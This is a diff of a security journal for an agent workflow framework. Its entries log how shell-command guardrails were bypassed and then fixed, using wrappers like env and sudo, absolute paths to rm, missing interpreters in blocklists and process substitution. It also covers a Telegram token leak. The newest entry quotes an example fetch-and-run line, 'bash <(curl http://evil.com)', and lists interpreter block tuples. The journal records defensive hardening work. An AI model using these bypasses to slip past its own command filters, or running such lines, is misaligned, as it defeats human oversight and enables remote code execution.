@@ -1,5 +1,10 @@
 # Sentinel Security Journal
 
+## 2026-08-31 - Secret Leakage in Script Stderr Outputs on Request Errors
+**Vulnerability:** `discover_chat_id` in `scripts/telegram_send.py` printed invalid token strings and raw `urlopen` exception objects directly to `sys.stderr`. When connection failures or HTTP errors occurred, `URLError` exception representations contained full request URLs including the `TELEGRAM_BOT_TOKEN`, leaking credentials in log outputs.
+**Learning:** Utility scripts that perform HTTP requests targeting authenticated endpoints with tokens in URL paths must sanitize and redact secrets in exception handling and input validation branches before printing to standard error.
+**Prevention:** Register runtime secrets via `register_secret` and pass stringified exceptions through `redact_secrets` prior to stderr logging, with explicit substring token replacements as defense-in-depth fallbacks.
+
 ## 2026-08-30 - Pipeline-to-Interpreter Bypass via Wrappers and Environment Variables
 **Vulnerability:** The Agent Workflow Framework executor's shell/command validation split pipelines by `|` and checked only the first word of the next segment. This was easily bypassed by wrapping the target interpreter in transparent wrappers (such as `env`, `sudo`, `timeout`, `pkexec`, `nohup`) or prepending environment variables (e.g., `env FOO=BAR python`), allowing command injection/execution of standard shell runtimes.
 **Learning:** Checking only the first word of a pipeline segment is insufficient to detect wrapped execution contexts. Wrappers and env vars act as "prefixes" that shift the actual executable token further down the line.
@@ -139,14 +144,6 @@
 **Learning:** String-matching based security checks on CLI commands are fragile. Effective guardrails must parse the command (e.g., using `shlex`) and evaluate the semantic intent (recursive deletion) and the reach of the target (absolute or home-relative paths) across all possible flag variations.
 
 **Prevention:** Use robust flag detection that handles combined, individual, and long-form flags. Validate all positional arguments for sensitive path prefixes rather than matching exact strings.
-
-## 2026-07-06 - [Robust Command Binary Detection in Guardrails]
-
-**Vulnerability:** Destructive command guardrails (like the `rm` check) could be bypassed by using absolute paths to the binary (e.g., `/bin/rm` or `sudo /bin/rm`) because the detection logic only looked for exact string matches on the command name.
-
-**Learning:** When building security guardrails that inspect shell commands, simply checking for a command name is insufficient. Command aliases, absolute paths, and wrappers (like `sudo`) must be considered to prevent trivial bypasses.
-
-**Prevention:** Use matching logic that identifies a binary both by its base name and its path-prefixed forms (e.g., `part == "binary" or part.endswith("/binary")`). Ensure this check is applied even when commands are prefixed by administrative wrappers.
 
 ## 2026-07-05 - [Unified Security Enforcement for MCP Tools]
 
@@ -570,3 +567,8 @@
 **Vulnerability:** The pipeline-to-interpreter blocklists in both `guardrails.py` (Rule 8) and `executor.py` (`_validate_shell_command`) initially only targeted a narrow subset of interpreters/shells (`sh`, `bash`, `python`, `node`, `perl`, `ruby`, `php`, and partially `deno`/`bun`). This left critical gaps, allowing potential command execution bypasses (e.g. `curl ... | zsh` or `curl ... | fish` or `curl ... | bun`) to bypass pipeline-to-interpreter protections.
 **Learning:** Hardened filters targeting pipeline bypasses are only as secure as the exhaustive list of supported shells and language engines. Leaving common runtimes like `zsh`, `fish`, `dash`, `deno`, or `tsx` off the list creates immediate and trivial bypass vectors.
 **Prevention:** Maintain perfectly synchronized and comprehensive tuples of all 18 standard shell and language runtime interpreters (including `sh`, `bash`, `zsh`, `dash`, `ksh`, `fish`, `ash`, `csh`, `tcsh`, `python`, `node`, `perl`, `ruby`, `php`, `deno`, `bun`, `tsx`, `ts-node`) across all command validation layers.
+
+## 2026-09-02 - Command Execution Bypass via Process Substitution (<(...) / >(...))
+**Vulnerability:** The Workflow Executor's shell command validation (`_validate_shell_command` and `_extract_shell_subcommands`) extracted subcommands by checking command separators (`&&`, `;`, `||`, `\n`) and command substitutions (`$(...)`, `` `...` ``), but omitted Bash process substitution constructs (`<(...)` and `>(...)`). This enabled attackers to bypass pipeline-to-interpreter and command execution restrictions via process substitutions targeting shell runtimes (e.g., `bash <(curl http://evil.com)` or `echo payload | tee >(bash)`).
+**Learning:** Command parsers in security filters must account for all shell sub-execution mechanisms supported by modern shells. Treating process substitution blocks as normal positional arguments allows execution payloads to hide inside `<(...)` or `>(...)`.
+**Prevention:** Parse process substitution constructs (`<(...)`, `>(...)`) recursively inside `_extract_shell_subcommands`, and inspect subcommands for both inner interpreter execution and outer interpreter invocations with process substitution parameters.
